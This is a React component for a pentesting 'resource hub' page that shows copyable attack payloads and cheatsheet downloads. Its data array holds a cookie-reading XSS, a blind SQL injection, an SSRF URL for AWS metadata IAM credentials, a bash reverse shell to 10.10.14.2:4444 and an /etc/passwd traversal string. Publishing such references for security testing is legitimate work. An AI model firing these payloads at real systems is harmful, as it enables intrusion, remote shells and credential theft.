import React, { useState } from 'react';
import { Search, Copy, Check, Terminal, FileText, Download, Sparkles, Filter, Shield, BookOpen } from 'lucide-react';

export const LandingResourceHub: React.FC = () => {
  const [search, setSearch] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const payloads = [
    {
      id: 'xss-1',
      title: 'SVG Event Handler XSS',
      category: 'XSS',
      risk: 'High',
      code: `<svg onload="alert(document.cookie)">`,
      description: 'Bypasses standard image tag filters and executes in modern DOM contexts.'
    },
    {
      id: 'sqli-1',
      title: 'Time-Based Blind SQL Injection (PostgreSQL)',
      category: 'SQLi',
      risk: 'Critical',
      code: `' UNION SELECT NULL, pg_sleep(5)--`,
      description: 'Verifies SQL injection vulnerabilities when no output is reflected in response.'
    },
    {
      id: 'ssrf-1',
      title: 'AWS Metadata Instance Profile Extraction',
      category: 'SSRF',
      risk: 'Critical',
      code: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      description: 'Extracts cloud IAM credentials from vulnerable SSRF endpoints.'
    },
    {
      id: 'rce-1',
      title: 'BASH Reverse Shell One-Liner',
      category: 'Command Injection',
      risk: 'Critical',
      code: `bash -i >& /dev/tcp/10.10.14.2/4444 0>&1`,
      description: 'Standard interactive reverse shell payload for Linux target environments.'
    },
    {
      id: 'lfi-1',
      title: 'Null-Byte Bypassed Path Traversal',
      category: 'LFI & Traversal',
      risk: 'High',
      code: `../../../../etc/passwd%00`,
      description: 'Reads local system files on legacy PHP & web server configurations.'
    },
    {
      id: 'xss-2',
      title: 'DOM-based Polyglot XSS',
      category: 'XSS',
      risk: 'High',
      code: `javascript:"/*\`/*\`/*'/*"/*\`/*\`/*\`*/onload=alert(1)//`,
      description: 'Multi-context payload designed to execute across HTML, Attribute, and Script blocks.'
    }
  ];

  const categories = ['All', 'XSS', 'SQLi', 'SSRF', 'Command Injection', 'LFI & Traversal'];

  const filteredPayloads = payloads.filter((p) => {
    const matchesCat = selectedCategory === 'All' || p.category === selectedCategory;
    const matchesSearch =
      p.title.toLowerCase().includes(search.toLowerCase()) ||
      p.code.toLowerCase().includes(search.toLowerCase()) ||
      p.category.toLowerCase().includes(search.toLowerCase());
    return matchesCat && matchesSearch;
  });

  const handleCopy = (id: string, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const cheatsheets = [
    { title: 'Nmap Port Scanning Cheatsheet', tag: 'Reconnaissance', pages: '4 Pages PDF' },
    { title: 'Burp Suite Pro Macro Playbook', tag: 'Proxy & Intercept', pages: '6 Pages PDF' },
    { title: 'Linux Privilege Escalation Vector Map', tag: 'Post-Exploitation', pages: '8 Pages PDF' },
    { title: 'Web App Pentesting Methodology v2.4', tag: 'Methodology', pages: '12 Pages PDF' }
  ];

  return (
    <div className="animate-fade-in py-16 max-w-7xl mx-auto px-4 sm:px-6">
      {/* Header */}
      <div className="text-center max-w-3xl mx-auto mb-12 space-y-4">
        <span className="font-mono text-xs text-indigo-600 dark:text-indigo-400 uppercase tracking-widest font-bold px-3 py-1 bg-indigo-50 dark:bg-indigo-950/40 rounded-full border border-indigo-100 dark:border-indigo-900/40">
          [ HACKER RESOURCE HUB ]
        </span>
        <h2 className="text-3xl sm:text-5xl font-extrabold text-slate-900 dark:text-white tracking-tight">
          Curated Payloads & Cheatsheets
        </h2>
        <p className="text-base sm:text-lg text-slate-600 dark:text-slate-400 leading-relaxed">
          Access tested exploit payloads, copyable one-liners, and security methodologies instantly.
        </p>
      </div>

      {/* Filter and Search Bar */}
      <div className="bg-white dark:bg-slate-900 rounded-2xl p-4 border border-slate-200 dark:border-slate-800 shadow-sm mb-8 space-y-4 md:space-y-0 md:flex md:items-center md:justify-between gap-4">
        <div className="relative flex-1 max-w-md">
          <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search payloads (XSS, SQLi, SSRF, reverse shell)..."
            className="w-full pl-10 pr-4 py-2.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 rounded-xl text-xs font-sans focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 text-slate-900 dark:text-white"
          />
        </div>

        {/* Category Pills */}
        <div className="flex items-center gap-1.5 overflow-x-auto pb-2 md:pb-0 scrollbar-none">
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => setSelectedCategory(cat)}
              className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
                selectedCategory === cat
                  ? 'bg-indigo-600 text-white shadow-sm'
                  : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>
      </div>

      {/* Payload Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-16">
        {filteredPayloads.map((p) => (
          <div
            key={p.id}
            className="bg-white dark:bg-slate-950 rounded-2xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm hover:shadow-xl hover:border-indigo-500/40 transition-all flex flex-col justify-between group"
          >
            <div>
              <div className="flex items-center justify-between mb-3">
                <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-950/40 px-2.5 py-1 rounded-md border border-indigo-100 dark:border-indigo-900/40">
                  {p.category}
                </span>
                <span
                  className={`text-[9px] font-extrabold px-2 py-0.5 rounded ${
                    p.risk === 'Critical'
                      ? 'bg-rose-500/10 text-rose-500 border border-rose-500/20'
                      : 'bg-amber-500/10 text-amber-500 border border-amber-500/20'
                  }`}
                >
                  {p.risk} Risk
                </span>
              </div>

              <h3 className="font-bold text-base text-slate-900 dark:text-white mb-2 leading-snug">
                {p.title}
              </h3>

              <p className="text-xs text-slate-500 dark:text-slate-400 mb-4 leading-relaxed">
                {p.description}
              </p>
            </div>

            {/* Code Block with Copy */}
            <div className="relative bg-slate-900 dark:bg-black rounded-xl p-3 font-mono text-xs text-emerald-400 border border-slate-800">
              <button
                onClick={() => handleCopy(p.id, p.code)}
                className="absolute top-2.5 right-2.5 p-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition-colors flex items-center gap-1 text-[10px]"
                title="Copy Payload"
              >
                {copiedId === p.id ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Copied!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy</span>
                  </>
                )}
              </button>
              <div className="pr-16 truncate font-mono">{p.code}</div>
            </div>
          </div>
        ))}
      </div>

      {/* Cheatsheet Downloads Bar */}
      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-6 flex items-center gap-2">
          <BookOpen className="w-5 h-5 text-indigo-500" />
          Technical Cheatsheets & Guides
        </h3>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {cheatsheets.map((cs, idx) => (
            <div
              key={idx}
              className="bg-slate-50 dark:bg-slate-900/50 rounded-2xl p-4 border border-slate-200 dark:border-slate-800 flex items-center justify-between group hover:border-indigo-500/40 transition-all"
            >
              <div>
                <div className="text-[10px] font-mono text-indigo-500 font-bold uppercase mb-1">
                  {cs.tag}
                </div>
                <div className="text-xs font-bold text-slate-900 dark:text-white line-clamp-1">
                  {cs.title}
                </div>
                <div className="text-[10px] text-slate-400 mt-1">{cs.pages}</div>
              </div>
              <button
                onClick={() => alert(`Downloading ${cs.title}...`)}
                className="p-2 rounded-xl bg-white dark:bg-slate-800 text-slate-600 dark:text-slate-300 group-hover:bg-indigo-600 group-hover:text-white transition-all shadow-sm shrink-0"
              >
                <Download className="w-4 h-4" />
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default LandingResourceHub;
